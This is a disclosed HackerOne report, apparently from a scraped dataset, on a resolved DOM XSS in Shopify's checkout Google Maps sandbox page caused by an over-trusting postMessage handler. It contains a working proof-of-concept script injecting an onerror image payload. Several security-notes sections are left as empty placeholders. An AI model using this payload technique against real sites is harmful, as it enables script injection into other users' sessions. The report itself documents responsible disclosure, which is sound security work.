---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '423218'
original_report_id: '423218'
title: H1514 DOM XSS on checkout.shopify.com via postMessage handler on /:id/sandbox/google_maps
weakness: Cross-site Scripting (XSS) - DOM
team_handle: shopify
created_at: '2018-10-13T05:28:07.606Z'
disclosed_at: '2019-11-04T02:16:08.726Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 45
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# H1514 DOM XSS on checkout.shopify.com via postMessage handler on /:id/sandbox/google_maps

## Metadata

- HackerOne Report ID: 423218
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: shopify
- Disclosed At: 2019-11-04T02:16:08.726Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Description:
The `/:id/sandbox/google_maps` and `/:id/sandbox/google_autocomplete` routes on `checkout.shopify.com` are used to render the Google Map on the "Order Status" page as well as the address prediction on checkout pages. The page performs origin validation on incoming postMessages making sure the origin matches the shop associated with `:id` but then trusts all communication after that validation. A malicious shop can render a Google Map (on checkout.shopify.com) with arbitrary HTML injected as a label which executes on checkout.shopify.com

# Technical Details:
Create a shop, capture it's ID (`4736483384` in this case). Then add the following script to the shop template:
```js
var frame = document.createElement("iframe");
frame.src = "https://checkout.shopify.com/4736483384/sandbox/google_maps";
frame.onload = function() {
  frame.contentWindow.postMessage("shopify_google_api:" + JSON.stringify({
    action: "createMapAndMarkers", 
    body: [{
      title: "<img src=xx: onerror=alert(document.domain)>"
    }]
  }), "*");
}
document.body.appendChild(frame);
```

# Steps To Reproduce:
Open [bored-engineering-whitehat-2.myshopify.com/#pwn](https://bored-engineering-whitehat-2.myshopify.com/#pwn), wait for the popup.

## Impact

XSS on checkout.shopify.com which hosts maps and other information for order statuses and cart checkouts.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
